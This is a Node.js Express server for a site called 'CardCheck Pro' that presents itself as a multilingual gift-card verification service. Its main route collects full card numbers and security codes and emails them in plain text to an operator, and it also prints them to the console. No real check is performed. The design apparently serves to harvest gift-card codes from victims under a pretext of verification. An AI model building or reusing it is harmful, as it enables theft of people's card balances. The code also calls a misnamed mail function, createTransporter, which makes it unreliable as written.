const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

// Configuration CORS
app.use(cors({
  origin: [
    'https://checkcardpro.com',
    'http://localhost:3000'
  ],
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Origin', 'Accept'],
  optionsSuccessStatus: 200
}));

console.log('🌐 CORS autorisé pour: https://checkcardpro.com');

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // limite à 10 soumissions par IP toutes les 15 minutes
  message: { 
    error: 'Trop de demandes. Veuillez réessayer dans 15 minutes.',
    success: false 
  }
});

app.use('/api/verify-card', limiter);

// Configuration Nodemailer
const transporter = nodemailer.createTransporter({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// Vérification de la configuration email au démarrage
transporter.verify((error, success) => {
  if (error) {
    console.log('❌ Erreur configuration email:', error);
  } else {
    console.log('✅ Configuration email validée');
  }
});

// Route de santé
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    service: 'CardCheck Pro Backend',
    cors: 'https://checkcardpro.com'
  });
});

// Route principale de vérification des cartes - COMPATIBLE AVEC VOTRE FRONTEND
app.post('/api/verify-card', async (req, res) => {
  try {
    const { 
      cardType, 
      cardNumber, 
      securityCode, 
      amount, 
      email, 
      clientName, 
      language = 'it' 
    } = req.body;

    // Validation des données essentielles
    if (!cardType || !cardNumber || !amount || !email) {
      return res.status(400).json({
        success: false,
        error: 'Données manquantes: cardType, cardNumber, amount et email requis'
      });
    }

    // Validation email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({
        success: false,
        error: 'Format email invalide'
      });
    }

    // Formatage de la date
    const formattedDate = new Date().toLocaleString('fr-FR', {
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });

    // Génération de l'ID de référence
    const referenceId = `VF${Date.now().toString(36).toUpperCase()}${Math.random().toString(36).substr(2, 4).toUpperCase()}`;

    // Traductions pour l'email
    const translations = {
      it: {
        subject: '🔐 Nuova richiesta di verifica',
        greeting: 'Nuova richiesta di verifica carta regalo',
        type: 'Tipo di carta',
        number: 'Numero carta',
        security: 'Codice di sicurezza',
        amount: 'Importo',
        client: 'Cliente',
        email: 'Email cliente',
        reference: 'Riferimento'
      },
      fr: {
        subject: '🔐 Nouvelle demande de vérification',
        greeting: 'Nouvelle demande de vérification de carte cadeau',
        type: 'Type de carte',
        number: 'Numéro de carte',
        security: 'Code de sécurité',
        amount: 'Montant',
        client: 'Client',
        email: 'Email client',
        reference: 'Référence'
      },
      en: {
        subject: '🔐 New Verification Request',
        greeting: 'New gift card verification request',
        type: 'Card type',
        number: 'Card number',
        security: 'Security code',
        amount: 'Amount',
        client: 'Client',
        email: 'Client email',
        reference: 'Reference'
      },
      es: {
        subject: '🔐 Nueva solicitud de verificación',
        greeting: 'Nueva solicitud de verificación de tarjeta regalo',
        type: 'Tipo de tarjeta',
        number: 'Número de tarjeta',
        security: 'Código de seguridad',
        amount: 'Cantidad',
        client: 'Cliente',
        email: 'Email del cliente',
        reference: 'Referencia'
      },
      nl: {
        subject: '🔐 Nieuwe verificatieaanvraag',
        greeting: 'Nieuwe verificatieaanvraag voor cadeaukaart',
        type: 'Kaarttype',
        number: 'Kaartnummer',
        security: 'Beveiligingscode',
        amount: 'Bedrag',
        client: 'Klant',
        email: 'Klant email',
        reference: 'Referentie'
      }
    };

    const t = translations[language] || translations.it;

    // Construction de l'email admin avec le nouveau format
    const adminEmailContent = `
🚀 CARDCHECK PRO - NOUVELLE DEMANDE DE VÉRIFICATION
═══════════════════════════════════════════════════════════

🆔 ${t.reference.toUpperCase()}: ${referenceId}
📅 DATE: ${formattedDate}
🌐 LANGUE: ${language.toUpperCase()}

👤 INFORMATIONS CLIENT:
═══════════════════════════
📧 ${t.email}: ${email}
👤 ${t.client}: ${clientName || 'Non fourni'}

💳 CARTE À VÉRIFIER:
═══════════════════════════
🎯 ${t.type}: ${cardType}
📝 ${t.number}: ${cardNumber}
${securityCode ? `🔐 ${t.security}: ${securityCode}` : ''}
💰 ${t.amount}: €${amount}

⚡ ACTIONS REQUISES:
═══════════════════════════
1. ✅ Vérifier la validité du numéro de carte
2. 💰 Vérifier le solde disponible  
3. 📅 Vérifier la date d'expiration
4. 📧 Répondre au client: ${email}

💡 MODÈLE DE RÉPONSE CLIENT:
═══════════════════════════════════════════
Objet: Résultats vérification - Réf ${referenceId}

Bonjour ${clientName || ''},

Nous avons vérifié votre carte ${cardType} d'un montant de €${amount}.

✅ STATUT: [VALIDE/INVALIDE/PARTIELLEMENT UTILISÉE]
💰 SOLDE DISPONIBLE: [XX €]
📅 DATE D'EXPIRATION: [JJ/MM/AAAA]

[Instructions d'utilisation si nécessaire]

Cordialement,
L'équipe CardCheck Pro
═══════════════════════════════════════════

⚠️ IMPORTANT: Répondez sous 2h pour maintenir la satisfaction client.

📊 SITE: https://checkcardpro.com
🎯 TAUX DE SATISFACTION: 98.5%
    `;

    // Options de l'email admin
    const adminMailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.ADMIN_EMAIL || process.env.EMAIL_USER,
      subject: `${t.subject} - ${cardType} €${amount} - ${email}`,
      text: adminEmailContent,
      html: `
        <div style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 700px; margin: 0 auto; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; border-radius: 15px;">
          <div style="background: white; padding: 30px; border-radius: 15px; box-shadow: 0 8px 32px rgba(0,0,0,0.1);">
            <div style="text-align: center; margin-bottom: 30px;">
              <h1 style="color: #2d3748; margin: 0; font-size: 24px;">🚀 CardCheck Pro</h1>
              <h2 style="color: #667eea; margin: 10px 0 0 0; font-size: 18px;">${t.greeting}</h2>
            </div>
            
            <div style="background: linear-gradient(45deg, #f7fafc, #edf2f7); padding: 20px; border-radius: 12px; margin: 20px 0; border-left: 4px solid #667eea;">
              <h3 style="color: #2d3748; margin: 0 0 15px 0;">🆔 ${t.reference}: <span style="font-family: monospace; color: #667eea;">${referenceId}</span></h3>
              <p style="color: #4a5568; margin: 5px 0;">📅 ${formattedDate}</p>
              <p style="color: #4a5568; margin: 5px 0;">🌐 ${language.toUpperCase()}</p>
            </div>
            
            <div style="background: #f8f9fa; padding: 25px; border-radius: 12px; margin: 20px 0;">
              <h3 style="color: #2d3748; margin: 0 0 20px 0; font-size: 16px;">👤 Informations Client</h3>
              <table style="width: 100%; border-collapse: collapse;">
                <tr style="border-bottom: 1px solid #e2e8f0;">
                  <td style="padding: 12px 0; font-weight: 600; color: #4a5568; width: 30%;">📧 ${t.email}:</td>
                  <td style="padding: 12px 0; color: #2d3748;">${email}</td>
                </tr>
                <tr>
                  <td style="padding: 12px 0; font-weight: 600; color: #4a5568;">👤 ${t.client}:</td>
                  <td style="padding: 12px 0; color: #2d3748;">${clientName || 'Non fourni'}</td>
                </tr>
              </table>
            </div>
            
            <div style="background: #fff5f5; border: 1px solid #fed7d7; padding: 25px; border-radius: 12px; margin: 20px 0;">
              <h3 style="color: #c53030; margin: 0 0 20px 0; font-size: 16px;">💳 Carte à Vérifier</h3>
              <table style="width: 100%; border-collapse: collapse;">
                <tr style="border-bottom: 1px solid #fed7d7;">
                  <td style="padding: 12px 0; font-weight: 600; color: #c53030; width: 30%;">🎯 ${t.type}:</td>
                  <td style="padding: 12px 0; color: #2d3748; font-weight: 600;">${cardType}</td>
                </tr>
                <tr style="border-bottom: 1px solid #fed7d7;">
                  <td style="padding: 12px 0; font-weight: 600; color: #c53030;">📝 ${t.number}:</td>
                  <td style="padding: 12px 0; color: #2d3748; font-family: monospace; font-size: 16px;">${cardNumber}</td>
                </tr>
                ${securityCode ? `
                <tr style="border-bottom: 1px solid #fed7d7;">
                  <td style="padding: 12px 0; font-weight: 600; color: #c53030;">🔐 ${t.security}:</td>
                  <td style="padding: 12px 0; color: #2d3748; font-family: monospace; font-size: 16px;">${securityCode}</td>
                </tr>
                ` : ''}
                <tr>
                  <td style="padding: 12px 0; font-weight: 600; color: #c53030;">💰 ${t.amount}:</td>
                  <td style="padding: 12px 0; color: #2d3748; font-size: 20px; font-weight: bold;">€${amount}</td>
                </tr>
              </table>
            </div>
            
            <div style="background: linear-gradient(45deg, #48bb78, #38a169); color: white; padding: 20px; border-radius: 12px; margin: 20px 0; text-align: center;">
              <h3 style="margin: 0 0 10px 0;">⚡ Actions Requises</h3>
              <ol style="text-align: left; margin: 10px 0; padding-left: 20px;">
                <li style="margin: 5px 0;">✅ Vérifier la validité du numéro</li>
                <li style="margin: 5px 0;">💰 Vérifier le solde disponible</li>
                <li style="margin: 5px 0;">📅 Vérifier la date d'expiration</li>
                <li style="margin: 5px 0;">📧 Répondre au client</li>
              </ol>
            </div>
            
            <div style="background: #f0fff4; border: 1px solid #9ae6b4; padding: 20px; border-radius: 12px; margin: 20px 0;">
              <p style="color: #22543d; margin: 0; text-align: center; font-size: 14px;">
                ⚠️ <strong>Répondre sous 2h</strong> pour maintenir la satisfaction client<br>
                🎯 Taux de satisfaction actuel: <strong>98.5%</strong>
              </p>
            </div>
            
            <div style="text-align: center; margin-top: 25px; padding: 15px; background: linear-gradient(45deg, #667eea, #764ba2); border-radius: 12px;">
              <p style="color: white; margin: 0; font-size: 14px;">
                🌐 <strong>CardCheck Pro</strong> • https://checkcardpro.com<br>
                ✅ Demande reçue le ${formattedDate}
              </p>
            </div>
          </div>
        </div>
      `
    };

    // Envoi de l'email à l'administrateur
    await transporter.sendMail(adminMailOptions);

    // Log pour le développement
    console.log('\n' + '='.repeat(60));
    console.log('📧 NOUVELLE DEMANDE DE VÉRIFICATION REÇUE');
    console.log('='.repeat(60));
    console.log(`📅 ${formattedDate}`);
    console.log(`🆔 Référence: ${referenceId}`);
    console.log(`👤 Client: ${email} (${clientName || 'Anonyme'})`);
    console.log(`💳 Carte: ${cardType} - €${amount}`);
    console.log(`📝 Numéro: ${cardNumber}`);
    if (securityCode) console.log(`🔐 Code: ${securityCode}`);
    console.log(`🌐 Langue: ${language}`);
    console.log('='.repeat(60));

    // Réponse de succès avec référence
    res.json({ 
      success: true, 
      message: 'Demande reçue avec succès',
      reference: referenceId,
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('❌ Erreur lors de l\'envoi de l\'email:', error);
    res.status(500).json({ 
      error: 'Erreur serveur lors de l\'envoi',
      success: false 
    });
  }
});

// Route pour les statistiques
app.get('/api/stats', (req, res) => {
  res.json({
    message: 'CardCheck Pro Backend Statistics',
    uptime: Math.floor(process.uptime()),
    version: '2.0.0',
    environment: process.env.NODE_ENV || 'production',
    timestamp: new Date().toISOString()
  });
});

// Gestion des erreurs 404
app.use('*', (req, res) => {
  res.status(404).json({ 
    error: 'Route non trouvée',
    success: false,
    availableRoutes: [
      'GET /api/health',
      'POST /api/verify-card',
      'GET /api/stats'
    ]
  });
});

// Gestion globale des erreurs
app.use((error, req, res, next) => {
  console.error('❌ Erreur serveur:', error);
  res.status(500).json({ 
    error: 'Erreur interne du serveur',
    success: false 
  });
});

// Démarrage du serveur
app.listen(PORT, () => {
  console.log('\n🚀 CARDCHECK PRO BACKEND V2.0 DÉMARRÉ');
  console.log('='.repeat(50));
  console.log(`📡 Port: ${PORT}`);
  console.log(`🌍 Environnement: ${process.env.NODE_ENV || 'production'}`);
  console.log(`📧 Email configuré: ${process.env.EMAIL_USER ? '✅' : '❌'}`);
  console.log(`🔐 Variables d'env: ${process.env.EMAIL_USER ? 'OK' : 'MANQUANTES'}`);
  console.log(`🌐 CORS: https://checkcardpro.com`);
  console.log('='.repeat(50));
  console.log(`📍 Santé: https://cardcheck-backend-production.up.railway.app/api/health`);
  console.log(`📊 Stats: https://cardcheck-backend-production.up.railway.app/api/stats`);
  console.log('\n✅ Prêt à recevoir les demandes de vérification!\n');
});

// Gestion propre de l'arrêt du serveur
process.on('SIGTERM', () => {
  console.log('🛑 Arrêt du serveur SIGTERM...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('\n🛑 Arrêt du serveur SIGINT (Ctrl+C)...');
  process.exit(0);
});

module.exports = app;
